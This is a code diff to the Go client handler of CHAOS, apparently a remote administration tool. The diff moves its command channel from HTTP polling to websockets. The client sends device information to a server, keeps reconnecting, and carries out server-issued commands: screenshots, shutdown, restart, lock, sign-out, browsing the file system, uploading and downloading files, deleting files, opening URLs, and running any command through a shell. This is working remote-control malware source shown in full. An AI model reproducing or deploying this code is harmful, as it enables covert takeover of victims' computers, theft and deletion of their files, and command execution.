@@ -3,216 +3,257 @@ package handler
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"github.com/tiagorlampert/CHAOS/client/app/gateway"
+	"github.com/tiagorlampert/CHAOS/client/app/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/gateways"
+	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/util/encode"
-	"log"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
 	"net/http"
-	"strings"
 	"time"
 )
 
 type Handler struct {
+	Connection    *websocket.Conn
 	Configuration *environment.Configuration
-	Gateway       gateway.Gateway
+	Gateway       gateways.Gateway
 	Services      *services.Services
-	MacAddress    string
+	ClientID      string
 	Connected     bool
-	DoingRequest  bool
 }
 
-func NewHandler(config *environment.Configuration, gateway gateway.Gateway, services *services.Services) *Handler {
-	specs, err := services.Information.LoadDeviceSpecs()
-	if err != nil {
-		panic(err)
-	}
+func NewHandler(
+	configuration *environment.Configuration,
+	gateway gateways.Gateway,
+	services *services.Services,
+	clientID string,
+) *Handler {
 	return &Handler{
-		Configuration: config,
+		Configuration: configuration,
 		Gateway:       gateway,
 		Services:      services,
-		MacAddress:    specs.MacAddress,
+		ClientID:      clientID,
 	}
 }
 
-func (h *Handler) ConnectWithServer() {
-	sleepTime := 2 * time.Minute
+func (h *Handler) KeepConnection() {
+	sleepTime := 30 * time.Second
+
 	for {
-		go func() {
-			if h.ServerIsAvailable() {
-				if err := h.SendDeviceSpecs(); err != nil {
-					sleepTime = 20 * time.Second
-					h.Connected = false
-					return
-				}
-				sleepTime = 2 * time.Minute
-				h.Connected = true
-				return
-			}
-			sleepTime = 5 * time.Second
+		if h.Connected {
+			time.Sleep(sleepTime)
+		}
+
+		err := h.ServerIsAvailable()
+		if err != nil {
+			h.Log("[!] Error connecting with server: " + err.Error())
 			h.Connected = false
-		}()
-		time.Sleep(sleepTime)
+			time.Sleep(sleepTime)
+			continue
+		}
+
+		err = h.SendDeviceSpecs()
+		if err != nil {
+			h.Log("[!] Error connecting with server: " + err.Error())
+			h.Connected = false
+			time.Sleep(sleepTime)
+			continue
+		}
+
+		h.Connected = true
 	}
 }
 
-func (h *Handler) ServerIsAvailable() bool {
-	url := fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Health)
+func (h *Handler) Log(v ...any) {
+	fmt.Println(v...)
+}
+
+func (h *Handler) ServerIsAvailable() error {
+	url := fmt.Sprint(h.Configuration.Server.Url, "health")
 	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
-	if err != nil {
-		return false
-	}
-	return res.StatusCode == http.StatusOK
-}
-
-func (h *Handler) SendDeviceSpecs() error {
-	specs, err := h.Services.Information.LoadDeviceSpecs()
-	if err != nil {
-		return err
-	}
-	body, err := json.Marshal(specs)
-	if err != nil {
-		return err
-	}
-	res, err := h.Gateway.NewRequest(http.MethodPost,
-		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Device), body)
 	if err != nil {
 		return err
 	}
 	if res.StatusCode != http.StatusOK {
-		return err
+		return fmt.Errorf(string(res.ResponseBody))
 	}
 	return nil
 }
 
-func (h *Handler) RequestDone() {
-	h.DoingRequest = false
+func (h *Handler) SendDeviceSpecs() error {
+	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
+	if err != nil {
+		return err
+	}
+	body, err := json.Marshal(deviceSpecs)
+	if err != nil {
+		return err
+	}
+	url := fmt.Sprint(h.Configuration.Server.Url, "device")
+	res, err := h.Gateway.NewRequest(http.MethodPost, url, body)
+	if err != nil {
+		return err
+	}
+	if res.StatusCode != http.StatusOK {
+		return fmt.Errorf("error with status code %d", res.StatusCode)
+	}
+	return nil
 }
 
-func (h *Handler) HandleServerRequest() {
-	commandURL := fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Command)
-
+func (h *Handler) Reconnect() {
+	h.Connected = false
 	for {
-		time.Sleep(2 * time.Second)
-		if h.DoingRequest || !h.Connected {
+		conn, err := ws.NewConnection(h.Configuration, h.ClientID)
+		if err != nil {
+			h.Log("[!] Error connecting on WS: ", err.Error())
+			time.Sleep(time.Second * 10)
 			continue
 		}
 
-		go func() {
-			defer h.RequestDone()
-			h.DoingRequest = true
-
-			res, err := h.Gateway.NewRequest(http.MethodGet,
-				fmt.Sprint(commandURL, "?address=", encode.Base64Encode(h.MacAddress)), nil)
-			if err != nil {
-				return
-			}
-			if res.StatusCode == http.StatusNoContent {
-				return
-			}
-
-			var payload entities.Payload
-			if err := json.Unmarshal(res.ResponseBody, &payload); err != nil {
-				return
-			}
-			if len(strings.TrimSpace(payload.Request)) == 0 {
-				return
-			}
-
-			var response []byte
-			var hasErr bool
-			switch strings.ToLower(strings.TrimSpace(payload.Request)) {
-			case "getos":
-				deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
-				if err != nil {
-					hasErr = true
-					response = encode.StringToByte(err.Error())
-					break
-				}
-				response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
-				break
-			case "screenshot":
-				screenshot, err := h.Services.Screenshot.TakeScreenshot()
-				if err != nil {
-					hasErr = true
-					response = encode.StringToByte(err.Error())
-					break
-				}
-				response = screenshot
-				break
-			case "restart":
-				if err := h.Services.OS.Restart(); err != nil {
-					hasErr = true
-					response = encode.StringToByte(err.Error())
-				}
-				break
-			case "shutdown":
-				if err := h.Services.OS.Shutdown(); err != nil {
-					hasErr = true
-					response = encode.StringToByte(err.Error())
-				}
-				break
-			default:
-				//FILE EXPLORER
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer) &&
-					strings.TrimSpace(payload.Request[:len(h.Configuration.CommandHandler.CommandFileExplorer)]) == h.Configuration.CommandHandler.CommandFileExplorer {
-					fileExplorer, err := h.Services.Explorer.ExploreDirectory(strings.TrimSpace(strings.ReplaceAll(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer, "")))
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					explorerBytes, _ := json.Marshal(fileExplorer)
-					response = explorerBytes
-					break
-				}
-
-				//DOWNLOAD FILE
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandDownload) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandDownload)] == h.Configuration.CommandHandler.CommandDownload {
-					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandDownload))
-					res, err := h.Services.Upload.UploadFile(filePath, fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Upload), "file")
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					response = res
-					break
-				}
-
-				//UPLOAD FILE
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandUpload) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandUpload)] == h.Configuration.CommandHandler.CommandUpload {
-					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandUpload))
-					res, err := h.Services.Download.DownloadFile(filePath)
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					response = res
-					break
-				}
-
-				//SHELL
-				response = encode.StringToByte(h.Services.Terminal.Run(payload.Request, h.Configuration.Connection.ContextDeadline))
-			}
-
-			requestBody, err := json.Marshal(entities.Payload{
-				MacAddress: h.MacAddress,
-				Response:   response,
-				HasError:   hasErr,
-			})
-			if err != nil {
-				return
-			}
-
-			res, err = h.Gateway.NewRequest(http.MethodPut, commandURL, requestBody)
-			if err != nil || res.StatusCode != http.StatusOK {
-				log.Println(err)
-			}
-		}()
+		h.Connection = conn
+		h.Connected = true
+		h.Log("[*] Successfully connected")
+		break
 	}
+}
+
+func (h *Handler) HandleCommand() {
+	for {
+		if !h.Connected {
+			h.Reconnect()
+			continue
+		}
+
+		_, message, err := h.Connection.ReadMessage()
+		if err != nil {
+			h.Log("[!] Error reading from connection:", err)
+			h.Reconnect()
+			continue
+		}
+
+		var request entities.Command
+		if err := json.Unmarshal(message, &request); err != nil {
+			continue
+		}
+
+		var response []byte
+		var hasError bool
+
+		switch request.Command {
+		case "getos":
+			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+				continue
+			}
+			response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
+			break
+		case "screenshot":
+			screenshot, err := h.Services.Screenshot.TakeScreenshot()
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+				break
+			}
+			response = screenshot
+			break
+		case "restart":
+			if err := h.Services.OS.Restart(); err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			break
+		case "shutdown":
+			if err := h.Services.OS.Shutdown(); err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			break
+		case "lock":
+			if err := h.Services.OS.Lock(); err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			break
+		case "sign-out":
+			if err := h.Services.OS.SignOut(); err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			break
+		case "explore":
+			fileExplorer, err := h.Services.Explorer.ExploreDirectory(request.Parameter)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			explorerBytes, _ := json.Marshal(fileExplorer)
+			response = explorerBytes
+			break
+		case "download":
+			filepath := request.Parameter
+			res, err := h.Services.Upload.UploadFile(filepath)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			response = res
+			break
+		case "delete":
+			filepath := request.Parameter
+			err := h.Services.Delete.DeleteFile(filepath)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			break
+		case "upload":
+			filepath := request.Parameter
+			res, err := h.Services.Download.DownloadFile(filepath)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			response = res
+			break
+		case "open-url":
+			err := h.Services.Url.OpenUrl(request.Parameter)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			break
+		default:
+			response, err = h.RunCommand(request.Command)
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+		}
+
+		body, err := json.Marshal(entities.Command{
+			ClientID: h.ClientID,
+			Response: response,
+			HasError: hasError,
+		})
+		if err != nil {
+			continue
+		}
+
+		err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
+		if err != nil {
+			continue
+		}
+	}
+}
+
+func (h *Handler) RunCommand(command string) ([]byte, error) {
+	return h.Services.Terminal.Run(command)
 }
